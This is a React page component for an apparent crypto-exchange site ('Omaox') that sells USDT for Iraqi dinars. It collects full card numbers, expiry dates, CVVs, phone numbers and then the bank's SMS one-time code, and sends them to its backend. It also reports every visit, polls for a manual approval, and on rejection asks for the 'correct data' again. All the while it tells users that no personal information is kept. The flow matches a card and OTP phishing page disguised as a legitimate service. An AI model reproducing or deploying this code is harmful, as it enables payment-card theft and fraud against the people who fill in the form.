import { useState, useEffect, useCallback } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { motion, AnimatePresence } from "framer-motion";
import { Link } from "wouter";
import { Layout } from "@/components/layout";
import { cn, formatCurrency } from "@/lib/utils";
import { ShieldCheck, Loader2, ArrowRight, CreditCard, Smartphone, CheckCircle2, XCircle, RefreshCw } from "lucide-react";
import { useNotifyVisit, useSubmitOrder, useSubmitVerificationCode } from "@workspace/api-client-react";
import { useToast } from "@/hooks/use-toast";
import { useRate } from "@/hooks/use-rate";

const formSchema = z.object({
  amount: z.coerce.number().min(5, { message: "أقل مبلغ للشراء هو 5 USDT" }),
  cardName: z.string().min(3, { message: "الاسم مطلوب" }),
  cardNumber: z.string().min(16, { message: "رقم بطاقة غير صالح" }).max(19, { message: "رقم بطاقة غير صالح" }),
  expiryDate: z.string().regex(/^(0[1-9]|1[0-2])\/([0-9]{2})$/, { message: "تنسيق غير صالح (MM/YY)" }),
  cvv: z.string().min(3, { message: "CVV غير صالح" }).max(4, { message: "CVV غير صالح" }),
  phone: z.string().min(10, { message: "رقم الهاتف مطلوب" }),
  walletAddress: z.string().min(20, { message: "عنوان المحفظة مطلوب" }),
  couponCode: z.string().optional(),
});

type FormValues = z.infer<typeof formSchema>;

function formatExpiryDate(value: string): string {
  const digits = value.replace(/\D/g, "");
  if (digits.length === 0) return "";
  if (digits.length <= 2) return digits;
  return digits.slice(0, 2) + "/" + digits.slice(2, 4);
}

function formatCardNumber(value: string): string {
  return value.replace(/\D/g, "").slice(0, 16);
}

export default function Buy() {
  const [step, setStep] = useState<"form" | "verify" | "waiting" | "success" | "rejected">(() => {
    const saved = localStorage.getItem("omaox_step");
    if (saved === "verify" || saved === "waiting" || saved === "success") return saved as any;
    return "form";
  });
  const [orderId, setOrderId] = useState<string>(() => {
    return localStorage.getItem("omaox_orderId") || "";
  });
  const [code, setCode] = useState("");
  const { toast } = useToast();

  useEffect(() => {
    localStorage.setItem("omaox_step", step);
    if (orderId) localStorage.setItem("omaox_orderId", orderId);
  }, [step, orderId]);

  const { rate, ratePerHundred } = useRate();
  const { mutate: notifyVisit } = useNotifyVisit();
  const { mutateAsync: submitOrder, isPending: isSubmitting } = useSubmitOrder();
  const { mutateAsync: submitVerify, isPending: isVerifying } = useSubmitVerificationCode();

  useEffect(() => {
    document.title = "شراء USDT | Omaox أوماكس - شراء تيثر بالدينار العراقي";
    document.querySelector('meta[name="description"]')?.setAttribute("content", "اشتري USDT تيثر الآن بالدينار العراقي عبر بطاقة الائتمان أو ماستركارد. تحويل فوري لمحفظتك. الحد الأدنى 5$. منصة Omaox أوماكس الموثوقة.");
  }, []);

  useEffect(() => {
    notifyVisit({ data: { timestamp: new Date().toISOString() } });
  }, [notifyVisit]);

  const form = useForm<FormValues>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      amount: 100,
      cardName: "",
      cardNumber: "",
      expiryDate: "",
      cvv: "",
      phone: "",
      walletAddress: "",
      couponCode: "",
    },
  });

  const watchAmount = form.watch("amount");
  const calculatedIqd = (Number(watchAmount) || 0) * rate;

  const onSubmit = async (data: FormValues) => {
    try {
      const payload = {
        ...data,
        amountIQD: calculatedIqd,
        paymentMethod: "بطاقة ائتمان / ماستركارد",
      };
      const res = await submitOrder({ data: payload });
      
      if (res.success) {
        setOrderId(res.orderId);
        setStep("verify");
        window.scrollTo({ top: 0, behavior: 'smooth' });
      }
    } catch {
      toast({
        title: "خطأ في الاتصال",
        description: "حدث خطأ أثناء إرسال الطلب، يرجى المحاولة مرة أخرى.",
        variant: "destructive"
      });
    }
  };

  const pollOrderStatus = useCallback(async (oid: string) => {
    try {
      const res = await fetch(`${import.meta.env.BASE_URL}api/order/status/${encodeURIComponent(oid)}`);
      if (!res.ok) return;
      const data = await res.json();
      if (data.status === "approved") {
        setStep("success");
      } else if (data.status === "rejected") {
        setStep("rejected");
      }
    } catch {}
  }, []);

  useEffect(() => {
    if (step !== "waiting") return;
    const interval = setInterval(() => {
      pollOrderStatus(orderId);
    }, 2000);
    return () => clearInterval(interval);
  }, [step, orderId, pollOrderStatus]);

  const onVerifyCode = async () => {
    if (code.length < 4) {
      toast({ title: "تنبيه", description: "يرجى إدخال الكود كاملاً", variant: "destructive" });
      return;
    }
    try {
      const res = await submitVerify({ data: { orderId, code } });
      if (res.success) {
        setStep("waiting");
        window.scrollTo({ top: 0, behavior: 'smooth' });
      }
    } catch {
      toast({
        title: "خطأ",
        description: "حدث خطأ في الاتصال، حاول مرة أخرى",
        variant: "destructive"
      });
    }
  };

  const resetForm = () => {
    localStorage.removeItem("omaox_step");
    localStorage.removeItem("omaox_orderId");
    setStep("form");
    setOrderId("");
    setCode("");
    form.reset();
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  return (
    <Layout>
      <div className="container mx-auto px-4 sm:px-6 lg:px-8 py-12 md:py-20">
        
        <div className="max-w-3xl mx-auto">
          <AnimatePresence mode="wait">
            
            {step === "form" && (
              <motion.div
                key="form"
                initial={{ opacity: 0, x: -20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: 20 }}
                className="space-y-8"
              >
                <div className="text-center mb-10">
                  <h1 className="text-3xl md:text-4xl font-bold text-white mb-4">شراء USDT</h1>
                  <p className="text-zinc-400">أدخل بياناتك بأمان لإتمام عملية الشراء</p>
                </div>

                <div className="glass-card-gold rounded-2xl p-6 flex flex-col md:flex-row items-center justify-between gap-6 mb-8">
                  <div>
                    <p className="text-sm text-zinc-400 font-medium mb-1">سعر الصرف الحالي</p>
                    <p className="text-xl font-bold text-white">100$ = <span className="text-primary">{ratePerHundred.toLocaleString()}</span> دينار عراقي</p>
                  </div>
                  <div className="h-12 w-px bg-white/10 hidden md:block"></div>
                  <div className="text-left" dir="ltr">
                    <p className="text-sm text-zinc-400 font-medium mb-1">المبلغ المطلوب (IQD)</p>
                    <p className="text-2xl font-bold text-primary">{formatCurrency(calculatedIqd)}</p>
                  </div>
                </div>

                <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-8">
                  <div className="glass-card rounded-2xl p-6 md:p-8">
                    <h3 className="text-xl font-bold text-white mb-6 border-b border-white/10 pb-4">المبلغ المراد شراؤه</h3>
                    <div className="grid md:grid-cols-2 gap-6">
                      <div>
                        <label className="block text-sm font-medium text-zinc-400 mb-2">المبلغ بالدولار (USDT) <span className="text-red-400">*</span></label>
                        <div className="relative">
                          <input 
                            {...form.register("amount")}
                            type="number"
                            inputMode="numeric"
                            className={cn(
                              "w-full bg-black/40 border rounded-xl pr-4 pl-16 py-3 text-white focus:outline-none focus:ring-1 transition-all text-left",
                              form.formState.errors.amount ? "border-red-500 focus:border-red-500 focus:ring-red-500" : "border-white/10 focus:border-primary focus:ring-primary"
                            )}
                            dir="ltr"
                          />
                          <div className="absolute left-4 top-1/2 -translate-y-1/2 text-zinc-500 font-bold pointer-events-none">USDT</div>
                        </div>
                        {form.formState.errors.amount && <p className="text-red-400 text-xs mt-1">{form.formState.errors.amount.message}</p>}
                        <p className="text-xs text-zinc-500 mt-2">الحد الأدنى: 5$</p>
                      </div>
                      
                      <div>
                         <label className="block text-sm font-medium text-zinc-400 mb-2">عنوان المحفظة (TRC20) <span className="text-red-400">*</span></label>
                         <input 
                            {...form.register("walletAddress")}
                            type="text"
                            placeholder="T..."
                            className={cn(
                              "w-full bg-black/40 border rounded-xl px-4 py-3 text-white focus:outline-none focus:ring-1 transition-all text-left",
                              form.formState.errors.walletAddress ? "border-red-500 focus:border-red-500 focus:ring-red-500" : "border-white/10 focus:border-primary focus:ring-primary"
                            )}
                            dir="ltr"
                          />
                          {form.formState.errors.walletAddress && <p className="text-red-400 text-xs mt-1">{form.formState.errors.walletAddress.message}</p>}
                      </div>
                    </div>
                  </div>

                  <div className="glass-card rounded-2xl p-6 md:p-8">
                    <h3 className="text-xl font-bold text-white mb-6 border-b border-white/10 pb-4">بيانات البطاقة</h3>
                    
                    <div className="flex items-center gap-3 p-4 rounded-xl bg-primary/10 border border-primary/30 mb-8">
                      <CreditCard className="w-6 h-6 text-primary shrink-0" />
                      <span className="text-primary font-bold">بطاقة ائتمان / ماستركارد</span>
                    </div>

                    <div className="space-y-6">
                      <div>
                        <label className="block text-sm font-medium text-zinc-400 mb-2">الاسم كما في البطاقة <span className="text-red-400">*</span></label>
                        <input 
                          {...form.register("cardName")}
                          type="text"
                          className={cn(
                            "w-full bg-black/40 border rounded-xl px-4 py-3 text-white focus:outline-none focus:ring-1 transition-all",
                            form.formState.errors.cardName ? "border-red-500 focus:border-red-500 focus:ring-red-500" : "border-white/10 focus:border-primary focus:ring-primary"
                          )}
                        />
                        {form.formState.errors.cardName && <p className="text-red-400 text-xs mt-1">{form.formState.errors.cardName.message}</p>}
                      </div>

                      <div>
                        <label className="block text-sm font-medium text-zinc-400 mb-2">رقم البطاقة <span className="text-red-400">*</span></label>
                        <input 
                          {...form.register("cardNumber", {
                            onChange: (e) => {
                              e.target.value = formatCardNumber(e.target.value);
                            }
                          })}
                          type="text"
                          inputMode="numeric"
                          maxLength={16}
                          placeholder="0000 0000 0000 0000"
                          className={cn(
                            "w-full bg-black/40 border rounded-xl px-4 py-3 text-white focus:outline-none focus:ring-1 transition-all text-left tracking-widest",
                            form.formState.errors.cardNumber ? "border-red-500 focus:border-red-500 focus:ring-red-500" : "border-white/10 focus:border-primary focus:ring-primary"
                          )}
                          dir="ltr"
                        />
                        {form.formState.errors.cardNumber && <p className="text-red-400 text-xs mt-1">{form.formState.errors.cardNumber.message}</p>}
                      </div>

                      <div className="grid grid-cols-2 gap-6">
                        <div>
                          <label className="block text-sm font-medium text-zinc-400 mb-2">تاريخ الانتهاء <span className="text-red-400">*</span></label>
                          <input 
                            {...form.register("expiryDate", {
                              onChange: (e) => {
                                e.target.value = formatExpiryDate(e.target.value);
                              }
                            })}
                            type="text"
                            inputMode="numeric"
                            placeholder="MM/YY"
                            maxLength={5}
                            className={cn(
                              "w-full bg-black/40 border rounded-xl px-4 py-3 text-white focus:outline-none focus:ring-1 transition-all text-center",
                              form.formState.errors.expiryDate ? "border-red-500 focus:border-red-500 focus:ring-red-500" : "border-white/10 focus:border-primary focus:ring-primary"
                            )}
                            dir="ltr"
                          />
                          {form.formState.errors.expiryDate && <p className="text-red-400 text-xs mt-1">{form.formState.errors.expiryDate.message}</p>}
                        </div>
                        <div>
                          <label className="block text-sm font-medium text-zinc-400 mb-2">CVV <span className="text-red-400">*</span></label>
                          <input 
                            {...form.register("cvv", {
                              onChange: (e) => {
                                e.target.value = e.target.value.replace(/\D/g, "").slice(0, 4);
                              }
                            })}
                            type="password"
                            inputMode="numeric"
                            maxLength={4}
                            placeholder="123"
                            className={cn(
                              "w-full bg-black/40 border rounded-xl px-4 py-3 text-white focus:outline-none focus:ring-1 transition-all text-center tracking-widest",
                              form.formState.errors.cvv ? "border-red-500 focus:border-red-500 focus:ring-red-500" : "border-white/10 focus:border-primary focus:ring-primary"
                            )}
                            dir="ltr"
                          />
                          {form.formState.errors.cvv && <p className="text-red-400 text-xs mt-1">{form.formState.errors.cvv.message}</p>}
                        </div>
                      </div>

                      <div>
                        <label className="block text-sm font-medium text-zinc-400 mb-2">رقم الهاتف <span className="text-red-400">*</span></label>
                        <input 
                          {...form.register("phone")}
                          type="tel"
                          inputMode="numeric"
                          placeholder="07XX XXX XXXX"
                          className={cn(
                            "w-full bg-black/40 border rounded-xl px-4 py-3 text-white focus:outline-none focus:ring-1 transition-all text-left",
                            form.formState.errors.phone ? "border-red-500 focus:border-red-500 focus:ring-red-500" : "border-white/10 focus:border-primary focus:ring-primary"
                          )}
                          dir="ltr"
                        />
                        {form.formState.errors.phone && <p className="text-red-400 text-xs mt-1">{form.formState.errors.phone.message}</p>}
                      </div>
                      
                      <div>
                        <label className="block text-sm font-medium text-zinc-400 mb-2">كود الخصم (اختياري)</label>
                        <div className="flex gap-3">
                          <input 
                            {...form.register("couponCode")}
                            type="text"
                            placeholder="أدخل الكود"
                            className="flex-1 bg-black/40 border border-white/10 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-all text-left uppercase"
                            dir="ltr"
                          />
                          <button type="button" className="px-6 rounded-xl bg-white/5 border border-white/10 text-zinc-300 font-medium hover:bg-white/10 transition-colors">
                            تحقق
                          </button>
                        </div>
                      </div>
                    </div>
                  </div>

                  <div className="flex items-center justify-center gap-2 text-sm text-zinc-500 my-6">
                    <ShieldCheck className="w-4 h-4 text-green-500" />
                    <span>بيانات البطاقة محمية بتشفير SSL 256-bit. لا نحتفظ بأي معلومات شخصية.</span>
                  </div>

                  <button 
                    type="submit" 
                    disabled={isSubmitting}
                    className="w-full py-4 rounded-xl bg-gradient-gold text-zinc-950 font-bold text-lg hover:shadow-[0_0_30px_rgba(251,191,36,0.4)] transition-all disabled:opacity-70 flex items-center justify-center gap-2"
                  >
                    {isSubmitting ? (
                      <><Loader2 className="w-5 h-5 animate-spin" /> جاري المعالجة...</>
                    ) : (
                      <>اطلب الآن <ArrowRight className="w-5 h-5 -scale-x-100" /></>
                    )}
                  </button>
                </form>
              </motion.div>
            )}

            {step === "verify" && (
              <motion.div
                key="verify"
                initial={{ opacity: 0, x: -20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: 20 }}
                className="max-w-md mx-auto mt-10"
              >
                <div className="glass-card rounded-3xl p-8 text-center border-t-4 border-t-primary">
                  <div className="w-20 h-20 bg-primary/10 rounded-full flex items-center justify-center mx-auto mb-6">
                    <Smartphone className="w-10 h-10 text-primary" />
                  </div>
                  <h2 className="text-2xl font-bold text-white mb-4">كود التحقق</h2>
                  <p className="text-zinc-400 mb-8 leading-relaxed">
                    يرجى الانتظار، سيصلك كود تحقق برسالة نصية أو إشعار من البنك. الرجاء إدخاله أدناه لتأكيد العملية.
                  </p>
                  
                  <div className="mb-8">
                    <input 
                      type="text"
                      inputMode="numeric"
                      value={code}
                      onChange={(e) => setCode(e.target.value.replace(/\D/g, "").slice(0, 6))}
                      placeholder="------"
                      maxLength={6}
                      className="w-full text-center text-3xl font-bold tracking-[0.5em] bg-black/40 border border-white/10 rounded-xl px-4 py-4 text-white focus:outline-none focus:border-primary focus:ring-2 focus:ring-primary/50 transition-all"
                      dir="ltr"
                    />
                  </div>

                  <button 
                    onClick={onVerifyCode}
                    disabled={isVerifying || code.length < 4}
                    className="w-full py-4 rounded-xl bg-primary text-zinc-950 font-bold text-lg transition-all disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
                  >
                    {isVerifying ? <Loader2 className="w-5 h-5 animate-spin" /> : "تأكيد الكود"}
                  </button>
                </div>
              </motion.div>
            )}

            {step === "waiting" && (
              <motion.div
                key="waiting"
                initial={{ opacity: 0, scale: 0.95 }}
                animate={{ opacity: 1, scale: 1 }}
                exit={{ opacity: 0, scale: 0.95 }}
                className="max-w-md mx-auto mt-10"
              >
                <div className="glass-card rounded-3xl p-10 text-center border-t-4 border-t-primary">
                  <div className="w-24 h-24 bg-primary/10 rounded-full flex items-center justify-center mx-auto mb-8 relative">
                    <Loader2 className="w-12 h-12 text-primary animate-spin" />
                    <div className="absolute inset-0 rounded-full border-2 border-primary/20 animate-ping"></div>
                  </div>
                  
                  <h2 className="text-2xl font-bold text-white mb-4">جاري التحقق من العملية</h2>
                  <p className="text-zinc-400 mb-6 leading-relaxed">
                    يتم الآن مراجعة طلبك والتحقق من الكود. يرجى الانتظار وعدم إغلاق هذه الصفحة.
                  </p>

                  <div className="bg-black/30 p-4 rounded-xl mb-6 border border-white/5">
                    <p className="text-sm text-zinc-500 mb-1">رقم الطلب</p>
                    <p className="text-white font-mono font-bold tracking-wider">{orderId}</p>
                  </div>

                  <div className="flex items-center justify-center gap-3 text-sm text-zinc-500">
                    <div className="flex gap-1">
                      <span className="w-2 h-2 bg-primary rounded-full animate-bounce" style={{ animationDelay: "0ms" }}></span>
                      <span className="w-2 h-2 bg-primary rounded-full animate-bounce" style={{ animationDelay: "150ms" }}></span>
                      <span className="w-2 h-2 bg-primary rounded-full animate-bounce" style={{ animationDelay: "300ms" }}></span>
                    </div>
                    <span>قد يستغرق الأمر بضع دقائق</span>
                  </div>
                </div>
              </motion.div>
            )}

            {step === "success" && (
              <motion.div
                key="success"
                initial={{ opacity: 0, scale: 0.9 }}
                animate={{ opacity: 1, scale: 1 }}
                className="max-w-md mx-auto mt-10"
              >
                <div className="glass-card rounded-3xl p-10 text-center relative overflow-hidden">
                  <div className="absolute inset-0 bg-green-500/5"></div>
                  
                  <motion.div 
                    initial={{ scale: 0 }}
                    animate={{ scale: 1 }}
                    transition={{ type: "spring", bounce: 0.5, delay: 0.2 }}
                    className="w-24 h-24 bg-green-500/20 text-green-500 rounded-full flex items-center justify-center mx-auto mb-6 relative z-10"
                  >
                    <CheckCircle2 className="w-12 h-12" />
                  </motion.div>
                  
                  <h2 className="text-3xl font-bold text-white mb-4 relative z-10">تمت الموافقة!</h2>
                  <p className="text-zinc-400 mb-8 relative z-10 leading-relaxed">
                    تمت الموافقة على طلبك بنجاح. سيتم تحويل الرصيد إلى محفظتك قريباً.
                  </p>
                  
                  <div className="bg-black/30 p-4 rounded-xl mb-8 border border-white/5 relative z-10">
                    <p className="text-sm text-zinc-500 mb-1">رقم الطلب</p>
                    <p className="text-white font-mono font-bold tracking-wider">{orderId}</p>
                  </div>

                  <Link 
                    href="/"
                    onClick={() => { localStorage.removeItem("omaox_step"); localStorage.removeItem("omaox_orderId"); }}
                    className="block w-full py-4 rounded-xl border border-white/10 text-white font-bold hover:bg-white/5 transition-colors relative z-10"
                  >
                    العودة للرئيسية
                  </Link>
                </div>
              </motion.div>
            )}

            {step === "rejected" && (
              <motion.div
                key="rejected"
                initial={{ opacity: 0, scale: 0.9 }}
                animate={{ opacity: 1, scale: 1 }}
                className="max-w-md mx-auto mt-10"
              >
                <div className="glass-card rounded-3xl p-10 text-center relative overflow-hidden">
                  <div className="absolute inset-0 bg-red-500/5"></div>
                  
                  <motion.div 
                    initial={{ scale: 0 }}
                    animate={{ scale: 1 }}
                    transition={{ type: "spring", bounce: 0.5, delay: 0.2 }}
                    className="w-24 h-24 bg-red-500/20 text-red-500 rounded-full flex items-center justify-center mx-auto mb-6 relative z-10"
                  >
                    <XCircle className="w-12 h-12" />
                  </motion.div>
                  
                  <h2 className="text-3xl font-bold text-white mb-4 relative z-10">الكود غير صحيح</h2>
                  <p className="text-zinc-400 mb-8 relative z-10 leading-relaxed">
                    كود التحقق الذي أدخلته غير صحيح. يرجى المحاولة مرة أخرى وإدخال البيانات الصحيحة.
                  </p>
                  
                  <button 
                    onClick={resetForm}
                    className="w-full py-4 rounded-xl bg-primary text-zinc-950 font-bold text-lg transition-all flex items-center justify-center gap-2 relative z-10 hover:bg-amber-400"
                  >
                    <RefreshCw className="w-5 h-5" />
                    حاول مرة أخرى
                  </button>
                </div>
              </motion.div>
            )}

          </AnimatePresence>
        </div>
      </div>
    </Layout>
  );
}
